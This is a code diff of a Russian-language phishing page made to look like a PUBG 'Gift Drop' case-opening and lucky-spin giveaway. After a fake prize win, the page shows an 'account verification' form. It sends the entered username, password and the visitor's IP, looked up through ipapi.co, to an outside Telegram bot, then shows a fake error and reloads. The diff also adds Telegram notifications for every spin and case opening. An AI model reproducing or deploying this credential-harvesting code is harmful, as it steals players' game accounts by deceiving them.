@@ -29,15 +29,20 @@
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            background-color: #000;
         }
 
-        /* --- ПРЕЛОАДЕР --- */
+        /* ЛОГОТИП В УГЛУ */
+        .header-logo {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));
+        }
+
         #preloader {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background-color: #0b0c0d;
             background-image: url('IMG_1807.png');
             background-size: cover;
             background-position: center;
@@ -50,61 +55,28 @@
 
         .loader-box {
             background: rgba(13, 15, 19, 0.9);
-            padding: 30px 40px;
+            padding: 30px 50px;
             border-radius: 15px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
         }
 
         .spinner-snake {
             width: 40px;
             height: 40px;
             border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #ffffff; 
+            border-top: 4px solid #ffffff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
-        /* --- HEADER --- */
-        header {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 0 12px;
-            display: flex;            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-            position: sticky; top: 0; z-index: 100;
-            height: 65px;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            width: 30%;
-        }
-
-        /* Стиль логотипа */
-        .main-logo {
-            height: 38px;
-            width: auto;
-            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
-        }
-
-        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
-
-        .balance-display {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 4px 10px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
         .uc-icon {
             display: inline-flex;
@@ -117,9 +89,38 @@
             font-size: 10px;
             font-weight: 900;
             color: #fff;
+            margin-right: 4px;
         }
 
-        /* --- GAMES --- */
+        header {
+            background: rgba(0, 0, 0, 0.95);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky; top: 0; z-index: 100;
+            height: 60px;
+        }
+
+        .balance-display {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 4px 10px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .btn-plus {
+            background: #4caf50;
+            width: 16px; height: 16px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 10px; font-weight: bold;
+        }
+
         .case-container {
             position: relative;
             width: 100%; height: 180px;
@@ -164,7 +165,9 @@
             font-weight: 700;
             font-size: 16px;
             text-align: center;
+            display: block;
             cursor: pointer;
+            transition: all 0.3s ease;
         }
 
         .nav-bar {
@@ -184,40 +187,35 @@
         }
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- ПРЕЛОАДЕР -->
     <div id="preloader">
         <div class="loader-box">
-            <div class="spinner-snake"></div>
-            <span class="pubg-font">Loading...</span></div>
+            <div class="spinner-snake"></div><span>loading...</span>
+        </div>
     </div>
 
     <header>
-        <div class="header-left">
-            <!-- КНОПКА НАЗАД (СКРЫТА) -->
-            <div id="backBtn" class="flex items-center gap-1 cursor-pointer" style="display: none;" onclick="showSection('hub')">
+        <div class="flex items-center" style="width: 100px;">
+            <!-- ЛОГОТИП ВМЕСТО КНОПКИ НАЗАД (КОГДА НА ГЛАВНОЙ) -->
+            <img id="mainLogo" class="header-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAABNCAMAAAA66vXzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAB7FBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8p77SFAAAAAWvHUk5TAnID8f8AAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH6AEZExIdInNfWwAAAm1JREFUeNrt2+dfEmEcB/DveSAnXmS598pS7pSbaS6980S5e5fXvPfeS5kyM6Vkyfufp9pA6IFDveD9vF+9n8fnc8C9YpS+PCHpX/pT6O05Y7YhBfK9Y6Y6YkO+f8SUYshY/id9xIZ87phtSIF85ZitSIF8z5itSIP8zphlSIP8ypiNSAF9pZidSAL9mZjNSAF9iZj9SAn9hpgDSAn9upgjSAn9qpgTSAn9ipgzSAn9vpg7SAn9upgHSAn9mphiSAn9qpiTSAn9aphDSAn9WphjSAn9KphTSAn9GphiSAn9CphTSAn9CpgLSAn9KphiSAn9CpgLSAn9CpgLSAn9KphiSAn9CpgLSAn9CpgLSAn9KphLSAn9CpgLSAn9KphiSAn9CpgLSAn9CpgLSAn9CpgLSAn9KpgLSAn9CpgLSAn9CpgLSAn9KpgLSAn9CpgLSAn9CpgLSAn9KphiSAn9CpgLSAn9CpgLSAn9KphiSAn9CpgLSAn9CpgLSAn9KphjSAn9KphiSAn9CphiSAn9GphiSAn9aphjSAn9aphjSAn9aphjSAn9CphjSAn9SphiSAn9SphiSAn9KphjSAn9CphjSAn9CphjSAn9KphjSAn9GphiSAn9CphiSAn9SphjSAn9WphiSAn9mphiSAn9uphjSAn9mphiSAn9qpiDSAn9mphiSAn9upiDSAn9qphDSAn9ipgzSAn9iphTSAn9ipiTSAn9mpgzSAn9mpiDSAn9mpgjSAn9mphiSAn9mphiSAn9ipgzSAn9ipgDSAn9KpiTSAn9vpgTSAn9upgjSAn9GphiSAn9SphCSAn9mphiSIn87phNfAF6h9iQXvYpPgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0wMS0yNVQxOTozMDoyOSswMDowMDtL/GMAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMDEtMjVUMTk6MzA6MjkrMDA6MDA9m2i+AAAAAElFTkSuQmCC" alt="PUBG Logo">
+            
+            <div id="backBtn" class="flex items-center gap-2 cursor-pointer" style="display: none;" onclick="showSection('hub')">
                 <i class="fas fa-chevron-left text-gray-400"></i>
-                <span class="text-[10px] font-bold uppercase">Back</span>
+                <span class="text-sm font-bold">Назад</span>
             </div>
-            <!-- ЛОГОТИП (ВСТАВЛЕН НАПРЯМУЮ) -->
-            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAYAAADm798XAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVFSURBVHgB7VxdSBRfGP5mdm1d3fInpSBoS9SFEIQpYm9C7SLoIugidZFe9SLoIugie9GLIDK6SLoIuqgr6SLoIuhC6UKvImiLpGVpba67687szun5vXN2d87O7Mzs7GzPr8N7mZ2Z873v+X7n833fOTvLpAiCIAiCIAiCIAiCIAiC0F8QUXQGfM997M8I3g6M3YhLCH0E/n8VfK7SscP8B9H5C/GZ/13Qf9g9D/B7u9u0KxP6F8Yp/I9mYpwiX6NznCH/f9i9Yf6D6PyF+Mz/Ougv7CqL0McInOEP8/e5nFv8p9B/8Of4/2D3ZvkPovMX4jP/q6B/sLsX9As899m5A+XN4K+i00H/Yf83/H+we8P8B9H5C/GZ/1XQX9h1GvYvE78H8Dcxm4D7DPYf9n+F/w92b5j/IDp/IT7zvwj6C7vLpAsY0VlG2AV39G7U6Pof8ZpY0An9S7vD4gIidI+x876fEf20/7R6OqFf6eI9Yvcl8T3v/62efshF7V+tXm6IsXGf9u+yKxX6iI6pW/s3W6p6P03oO7qoH+Pofat9C/f48z+H8/z3f34zY1X9R6v7X9Y+0B7Uv8t6Y699B5/7m96mH9H1BfE6r7f6/mZl/f9f6S8296vU/6v6X1Yf1B7Uv8tyYz/9CH73P73W9R9tV/9Rrfv/S/XF9r5G/b9qf7m9m871tT/177Lc9E/6EcLu7O+qG+2Y9R9tS/9R68p364v5f8X+Unu3ntsb699lubE/7YgIidA8v6S60Y7X9R9tR/8T2vB7O8f7L69/l+XGfqIDyYidB51Y93yC76ob7Zgl/Ufb8XpP19853v97Pee5K+r9N6v/X9U+7Gv/S8uNHXlI+X9C2J3fVTda8br+o237PcK5D+67+v6N5P5i9f9L64O/+59at+lHD6kjS/p3E8p/p1SOfuN0/Uf74PdY34Xz2M/2v6p9qP8X6t+VvN2HlH8m+m8Rduf97qob7Xhd/9F+7fcR7n9Y34X9Yv9L64f/+1/af6T8M8p/9xRhd9GdrhvteF3/0X7se4TzH69/t9Y/rn+X+v+N6oO/279Z6z96Sh1m6p9N6V9pP8LuvM/9u6v6m4Vv1v0f7Ye+R7h/sf9v9f8T9f839Y+N4Pf2bzY79U9O79+MMP5XfC9V198sfKfof7RP+x7h/mD7X7Vv4P7fof7/ov6v6Y+m9G/m4HeL6y8XvlV9z879D9snvX/hYf0/6t9l/0f96U9E/Y+6zOq7+D5V/O/n9P9q/2/fV9W79N+Y+p9fP/m5M97/z/4v8Z8n8L9R/f+z9Tev99mX/+f/L8ufm/fD2Gz87z+f5f/u/vD97/9H6X/+/3D/Wf7v3j/f//7/Yf3P631+6P9Z/u+O/7+F/h/W/6N++An0F/S9Nf+z8j8u9A8Onv/W/O8/P2P7KfsX6U/8n6T/h/Uf+hMG9P8H+P8d6E/8H8D/h/Uf+mPGv9R/7v/X0X96/8/R+69m/7+C/vR6+n/9S/3v/r/S//7/AfrTe/1L/e/u/yv97/8foD+9Xv8X/fP/f8D/AfoT9L01f/9A/6X9B/2H3fMAv7f7/wj9BaKzjLAL7ujdqFF/L9E/2L1h/oPo/IX4zP8q6C/sLovQxwico//m73M5t/hPof/gz/H/we7N8h9E5y/EZ/5XQf9gdy/oF3juI6v6X4R/L/nfxP97mP8M+g+75wF+b3ebdmVC/8L4P/k72f9P/o3YyfyH+I8Ym/P/A8O/I/7/g/zV/6S/4fD/oX/h8P8B5K/+N+N/xP8PEY+LfwG/Xf/yOfFf/yL+A8BfV7U3D9WlAAAAAElFTkSuQmCC" alt="PUBG Logo" class="main-logo" id="headerLogo">
         </div>
 
         <div class="text-center" style="flex: 1;">
-            <h1 class="pubg-font text-lg leading-none tracking-widest text-white/90">GIFT DROP</h1>
+            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
         </div>
 
-        <div class="flex justify-end items-center" style="width: 30%;">
-            <div class="balance-display">
-                <span class="uc-icon">UC</span>
-                <span id="headerBalance" class="text-sm font-bold">60</span>
-                <div class="btn-plus">+</div>
-            </div>
+        <div class="balance-display" style="width: 100px; justify-content: flex-end;">
+            <span class="uc-icon">UC</span>
+            <span id="headerBalance" class="text-sm font-bold">60</span>
+            <div class="btn-plus ml-1">+</div>
         </div>
     </header>
 
@@ -234,40 +232,40 @@
         </div>
     </main>
 
-    <!--СЕКЦИЯ КЕЙСА -->
     <section id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
         </div>
-        <div class="case-container">
+        <divclass="case-container">
             <div class="case-line"></div>
             <div id="caseTape" class="case-tape"></div>
         </div>
-        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">ОТКРЫТЬ (60 UC)</button>
+        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
+        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
     </section>
 
-    <!-- СЕКЦИЯ СПИНА -->
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
         </div>
         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
             <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="w-full h-full object-contain"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain"></div>
             </div>
         </div>
-        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">КРУТИТЬ (60 UC)</button>
+        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
     </section>
 
-    <!-- МОДАЛКИ -->
+    <!-- Модальные окна (оставил без изменений) -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
@@ -301,8 +299,18 @@
         let isSpinning = false;
         let userIP = '';
         const itemWidth = 140;
+        let currentWinCellId = null;
 
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')').catch(e => userIP = 'unknown');
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
+
+        function updateBalanceUI() {
+            document.getElementById('headerBalance').innerText = balance;
+            const canPlay = balance >= 60;
+            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
+            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
+            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
+            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
+        }
 
         function showSection(id) {
             if (isSpinning) return;
@@ -311,36 +319,53 @@
             document.getElementById('section-spin').style.display = 'none';
             document.getElementById('section-' + id).style.display = 'block';
 
-            if (id === 'hub') {
+            // Переключение между логотипом и кнопкой назад
+            if(id === 'hub') {
+                document.getElementById('mainLogo').style.display = 'block';
                 document.getElementById('backBtn').style.display = 'none';
-                document.getElementById('headerLogo').style.display = 'block';
+                document.getElementById('nav-hub').classList.add('active');
             } else {
+                document.getElementById('mainLogo').style.display = 'none';
                 document.getElementById('backBtn').style.display = 'flex';
-                document.getElementById('headerLogo').style.display = 'none';
+                document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+                if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
             }
-
-            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-            if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
+            
+            updateBalanceUI();
+            if (currentWinCellId) {
+                const winCell = document.getElementById(currentWinCellId);
+                if (winCell) {
+                    winCell.style.borderColor = 'transparent';
+                    winCell.style.boxShadow = 'none';
+                }
+                currentWinCellId = null;
+            }
         }
 
         function initCase() {
             const tape = document.getElementById('caseTape');
             tape.innerHTML = '';
-            for(let i=0; i<60; i++) {
-                let idx = Math.floor(Math.random() * prizeImages.length);
-                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
+            let lastIdx = -1;
+            for(let i=0; i<80; i++) {
+                let idx;
+                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
+                lastIdx = idx;tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
             }
+            tape.style.transform = `translateX(0px)`;
         }
 
         function openCase() {
             if (balance < 60 || isSpinning) return;
-            balance -= 60; document.getElementById('headerBalance').innerText = balance;
+            balance -= 60;
+            updateBalanceUI();
             isSpinning = true;
+            const targetIdx = 45; 
             const tape = document.getElementById('caseTape');
             const screenCenter = window.innerWidth / 2;
-            const finalOffset = (40 * itemWidth) - screenCenter + (itemWidth / 2);
+            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
             tape.style.transform = `translateX(-${finalOffset}px)`;
             setTimeout(() => {
+                sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
                 isSpinning = false;
                 startAuth();
             }, 5000);
@@ -348,23 +373,50 @@
 
         function startSpin() {
             if (isSpinning || balance < 60) return;
-            balance -= 60; document.getElementById('headerBalance').innerText = balance;
+            balance -= 60;
+            updateBalanceUI();
             isSpinning = true;
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let step = 0;
-            const totalSteps = 20 + Math.floor(Math.random() * 10);
+            const totalSteps = 25 + Math.floor(Math.random() * 10);
+            const winIndex = Math.floor(Math.random() * cells.length);
+            const winCellId = cells[winIndex];
+            document.getElementById('spinBtn').style.display = 'none';
             const interval = setInterval(() => {
-                cells.forEach(id => document.getElementById(id).style.borderColor = 'transparent');
-                document.getElementById(cells[step % cells.length]).style.borderColor = '#ffbc00';
+                cells.forEach(id => {
+                    const cell = document.getElementById(id);
+                    cell.style.borderColor = 'transparent';
+                    cell.style.boxShadow = 'none';
+                });
+                const currentId = cells[step % cells.length];
+                const currentEl = document.getElementById(currentId);
+                currentEl.style.borderColor = '#ffbc00';
+                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
                 step++;
                 if (step >= totalSteps) {
                     clearInterval(interval);
-                    setTimeout(() => { isSpinning = false; startAuth(); }, 500);
+                    cells.forEach(id => {
+                        const cell = document.getElementById(id);
+                        cell.style.borderColor = 'transparent';
+                        cell.style.boxShadow = 'none';
+                    });
+                    const winCell = document.getElementById(winCellId);
+                    winCell.style.borderColor = '#ffbc00';
+                    winCell.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.8)';
+                    currentWinCellId = winCellId;
+                    setTimeout(() => {
+                        document.getElementById('spinDepositBtn').style.display = 'block';
+                        sendTelegram(`🎡 Рулетка | IP: ${userIP}`);
+                        isSpinning = false;
+                    }, 500);
                 }
-            }, 150);
+            }, 120);
         }
 
-        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
+        function startAuth() { 
+            document.getElementById('modalAuth').style.display = 'flex'; 
+        }
+        
         function openForm(m) {
             document.getElementById('modalAuth').style.display = 'none';
             document.getElementById('modalForm').style.display = 'flex';
@@ -375,22 +427,27 @@
             const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
             if(u.length < 3 || p.length < 3) return alert('Заполните все поля');
+            await sendTelegram(`🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
+            alert('Ошибка. Недостаточный уровень доверия аккаунта. Попробуйте другой метод.');
+            location.reload();
+        }
+
+        async function sendTelegram(t) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: `🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`})
-            });
-            alert('Ошибка верификации. Попробуйте другой аккаунт.');
-            location.reload();
+                body: JSON.stringify({chat_id: CHAT_ID, text: t})
+            }).catch(e => {});
         }
 
         window.onload = () => {
             initCase();
+            updateBalanceUI();
             setTimeout(() => {
                 const loader = document.getElementById('preloader');
                 loader.style.opacity = '0';
-                setTimeout(() => loader.style.display = 'none', 500);
-            }, 1500);
+                setTimeout(() => { loader.style.display = 'none'; }, 500);
+            }, 2000);
         };
     </script>
 </body>
